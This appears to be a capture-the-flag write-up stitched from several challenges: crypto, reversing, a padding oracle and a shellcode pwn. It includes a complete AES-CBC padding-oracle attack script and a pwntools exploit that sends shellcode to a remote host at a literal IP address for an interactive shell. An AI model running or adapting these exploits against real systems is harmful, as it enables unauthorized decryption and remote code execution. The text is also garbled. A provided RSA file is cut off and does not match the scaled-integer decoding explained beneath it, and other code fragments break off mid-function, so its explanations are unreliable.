1. Provided `python` file
    ```python

    from math import prod
    from Crypto.Util.number import getPrime, bytes_to_long

    def generate_prime_from_byte(byte_val):
        assert 0 <= byte_val <= 255
        r = random.Random()
        r.seed(byte_val)
        return getPrime(512, randfunc=r.randbytes)

    def main():
        FLAG = open("flag.txt", "rb").read().strip()
        primes = [generate_prime_from_byte(b) for b in FLAG]

        N = prod(primes)

        e = 0x10001

        m = bytes_to_long(FLAG)
        c = pow(m, e, N)

        print(f"N = {hex(N)}")

    if __name__ == "__main__":

Each character `ord(c)` is multiplied by a fixed ratio, then rounded into a huge integer output.


1. **Inspect output.txt**
   It contains a long list of huge integers. Intuitively each integer should represent one character.
2. **Take GCD**
   Since all numbers are scaled by the same factor, taking the greatest common divisor (GCD) removes the large shared component.
3. **Linear relation**
   After GCD normalization, each number is still `constant K × character ASCII`.
   We need to recover this `K`.
4. **Use known prefix**
   The flag must start with `"CRHC{"`, so ASCII values of those 5 chars are known.
   Fit the scale `K` by least squares to correctly recover all characters.
5. **Recover the string**
   After getting `K`, divide each number by `K`, round to ASCII, and convert to characters. Finally extract `CRHC{...}` with regex to get the full flag.

def decode_from_output(path):
    with open(path, 'r') as f:
        l = json.load(f)['l']

    # Step 1: GCD normalization
    g = reduce(gcd, (abs(x) for x in l))
    u = [x // g for x in l]

    # Step 2: fit scale using "CRHC{" prefix
    prefix = "CRHC{"
    t = [ord(c) for c in prefix]
    K = sum(ui*ti for ui,ti in zip(u[:len(t)], t)) / sum(ti*ti for ti in t)

    # Step 3: decode
    dec = [round(ui / K) for ui in u]
    plaintext = ''.join(chr(x) for x in dec)

    # Step 4: extract flag
    m = re.search(r'CRHC\{.*?\}', plaintext)
    return m.group(0) if m else None

    * Sending the provided ciphertext `1dbef3236e74e1bf9e7238102f5c4f9a1ac669f8a3bc5ea6f903085b4429e66f3089a928e64ac26b9f6e3c800c55d833` returns `Valid padding`.
    * This indicates a Padding Oracle service: it reveals whether decrypted data has valid PKCS#7 padding (`Valid padding` vs `Invalid padding`), leaking decryption information usable for the attack.

2.  **Attack Principle:**
    * Padding Oracle attack exploits AES-CBC properties. Decryption follows $P = D(C) \oplus C_{prev}$, where:
        * $P$ is the plaintext block.
        * $D(C)$ is the AES-decrypted ciphertext block (the “intermediate state”).
        * $C_{prev}$ is the previous ciphertext block or IV.
    * We do not know $D(C)$, but we can control $C_{prev}$. Modifying bytes in $C_{prev}$ changes resulting plaintext $P$.
    * The goal is to recover intermediate-state bytes one by one. Once known, plaintext byte follows $P[i] = D(C)[i] \oplus C_{prev}[i]$.

3.  **Implementation:**
    * Split provided ciphertext into IV and two 16-byte ciphertext blocks.
    * Start from the last block and decrypt bytes right-to-left.
    * To recover the first target byte (last byte), enforce padding `0x01`.
    * Brute-force previous block's last byte from 0 to 255, building and sending modified ciphertext each time.
    * On `Valid padding`, we know the decrypted last plaintext byte is `0x01`.
    * Then compute intermediate byte via `D(C)[15] = P[15] \oplus C'_{prev}[15]` with $P[15]=0x01$.
    * Continue with the second-last byte using padding `0x02`, and adjust already recovered bytes accordingly; repeat until block is fully decrypted.

4.  **Script and Result:**
    * A Python script automates the process: connect, send modified ciphertexts, and derive/store intermediate state and plaintext from server responses.
    ```python
    import socket
    import binascii
    from itertools import product
    from tqdm import tqdm

    HOST = "23.146.248.136"
    PORT = 9999
    BLOCK_SIZE = 16
    CIPHERTEXT_HEX = "1dbef3236e74e1bf9e7238102f5c4f9a1ac669f8a3bc5ea6f903085b4429e66f3089a928e64ac26b9f6e3c800c55d833"

    def send_ciphertext(conn, ciphertext):
        """
        Sends the ciphertext to the server and receives the response.
        """
        conn.sendall(binascii.hexlify(ciphertext) + b'\n')
        response = conn.recv(1024)
        return response

    def main():
        ciphertext_bytes = binascii.unhexlify(CIPHERTEXT_HEX)
        iv = ciphertext_bytes[:BLOCK_SIZE]
        ct = ciphertext_bytes[BLOCK_SIZE:]

        blocks = [iv] + [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]
        num_blocks = len(blocks)

        plaintext = bytearray()

        print("Starting Padding Oracle attack...")

        # Iterate through each block from the second to the last
        for block_num in range(1, num_blocks):
            print(f"Decrypting block {block_num}...")

            # We need to find the intermediate state of the current block
            intermediate = bytearray(BLOCK_SIZE)

            # Iterate through each byte of the block from right to left
            for pad_byte in tqdm(range(1, BLOCK_SIZE + 1)):
                # Create a modified previous block
                previous_block = bytearray(blocks[block_num - 1])

                # Apply the desired padding to the bytes we have already found
                for i in range(1, pad_byte):
                    previous_block[BLOCK_SIZE - i] = intermediate[BLOCK_SIZE - i] ^ pad_byte

                # Find the correct byte by trying all possibilities
                for guess in range(256):

                    # Set the current byte to test
                    previous_block[BLOCK_SIZE - pad_byte] = guess

                    # Construct the new ciphertext to send to the server
                    modified_ciphertext = previous_block + blocks[block_num]

                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        try:
                            s.connect((HOST, PORT))
                            _ = s.recv(1024) # Read the welcome message
                            response = send_ciphertext(s, modified_ciphertext)

                            if b"Valid padding" in response:
                                intermediate_byte = guess ^ pad_byte
                                intermediate[BLOCK_SIZE - pad_byte] = intermediate_byte
                                break
                        except Exception as e:
                            print(f"Connection error: {e}")
                            continue

            # Calculate the plaintext for the current block
            current_plaintext = bytearray()
            for i in range(BLOCK_SIZE):
                plaintext_byte = intermediate[i] ^ blocks[block_num - 1][i]
                current_plaintext.append(plaintext_byte)

            plaintext.extend(current_plaintext)

            print(f"Block {block_num} decrypted: {current_plaintext.hex()}")

        print("\nDecryption complete!")
        print(f"Raw decrypted plaintext: {plaintext.hex()}")

        # Check for the flag format
        try:
            flag_string = plaintext.decode('utf-8')
            if flag_string.startswith("CRHC{"):
                print(f"Found flag: {flag_string}")
            else:
                print(f"Decoded plaintext: {flag_string}")
        except UnicodeDecodeError:
            print("Could not decode plaintext as UTF-8.")

    if __name__ == "__main__":
        main()
    ```
    * The script output gave two decrypted blocks:
        * `Block 1 decrypted: 435248437b70346464316e395f307234`
        * `Block 2 decrypted: 6331335f31355f633030317d04040404`
    * Concatenating the two hex strings and decoding UTF-8 yields:
        `CRHC{p4dd1n9_0r4c13_15_c001}\x04\x04\x04\x04`
    * Remove trailing padding bytes `\x04` to obtain the flag.

    __int64 __fastcall check_flag(const char *a1)
    {
      int i;

      // Check whether input length equals global variable len
      if ( strlen(a1) != len )
        return 0;

      // Compare character by character
      for ( i = 0; i < len; ++i )
      {

`check_flag` logic is straightforward:
1.  It takes string `a1` (user input).
2.  It XORs each input char `a1[i]` with dynamic key `(23 * i + 3 + 7 * (i % 4))`.
3.  It compares results with corresponding values in array `secret[i]`.

To recover the original flag, reverse this algorithm. By XOR property (`A ^ B = C` implies `A ^ C = B`), decryption is:

`flag[i] = secret[i] ^ (23 * i + 3 + 7 * (i % 4))`

Now we have the algorithm, but still need two key values:
1.  Contents of `secret` array.
2.  Value of `len` (flag length).

## DNA Reconfiguration
1.  **Recon and vulnerability confirmation**
    * Connect to remote service `23.146.248.136:10023` with `nc`; it asks for a "DNA sequence" input.
    * Decompile binary in IDA and inspect `main`.
    * Program maps an RWX memory region using `mmap`, size `0x64` (100 bytes).
    * Then `read(0, buf, 0x80u)` reads `0x80` (128) bytes into that `0x64` (100-byte) buffer.
    * This is a classic **buffer overflow**: input exceeds buffer size and overwrites subsequent memory.

2.  **Exploitation method**
    * Besides overflow, it also allows direct execution of our input.
    * At end of `main`, it executes `((void (*)(void))buf)();`, calling our input buffer as a function pointer.
    * Since input memory is executable (RWX), this is a perfect **direct shellcode execution** vulnerability. Just send shellcode as input.
    * There are also two checks:
        * A checksum loop; ensure shellcode satisfies `v4 != 255`.
        * A call to `sub_13FA`; without its code, assume standard shellcode can pass.

3.  **Write exploit script**
    * Use `pwntools` to write exploit.
    * First generate 64-bit Linux shellcode via `asm(shellcraft.sh())`.
    * Pad shellcode to buffer size to satisfy `read` constraints.
    * Connect to remote server, send shellcode, then switch to interactive mode for shell access.
    ```python
    from pwn import *

    # Set the context for the target architecture
    context.arch = 'amd64'
    context.os = 'linux'

    # Remote connection
    HOST = '23.146.248.136'
    PORT = 10023

    # Generate shellcode for a 64-bit shell
    # Using pwntools' shellcraft for convenience
    shellcode = asm(shellcraft.sh())

    # Pad the shellcode to a safe length
    # The buffer size is 100 (0x64), we can read up to 128 (0x80)
    # We will pad it to 100 to avoid overwriting anything critical, though the vuln is that we can go up to 128.
    # We will send 128 bytes to satisfy the read call.
    # The shellcode itself should not exceed 100 bytes.
    # We will pad to 100 (0x64) bytes.
    payload = shellcode.ljust(100, b'\x90') # Use NOPs to fill the space

    # We don't have the checksum function, but we can verify it.
    # Let's assume the default shellcode will pass this test.
    # If not, we can adjust the payload.
    # If the code crashes at the checksum, we need to manually adjust the last byte to make the sum != 255.
    # Let's calculate the checksum of our payload.
    checksum = 0
    for i in range(len(payload)):
        checksum += (i + 1) * payload[i]
    # We need checksum != 255. Since a shellcode is complex, this is very likely to pass.

    # Establish connection
    p = remote(HOST, PORT)

    # Receive the welcome messages
    p.recvuntil(b"Input your DNA sequence below:\n")

    # Send the payload
    p.send(payload)

    # Receive final messages before shell
    p.recvuntil(b"Synthesizing and activating DNA sequence...\n")
    p.recvline()

    # You should now have a shell!
    p.interactive()
    ```
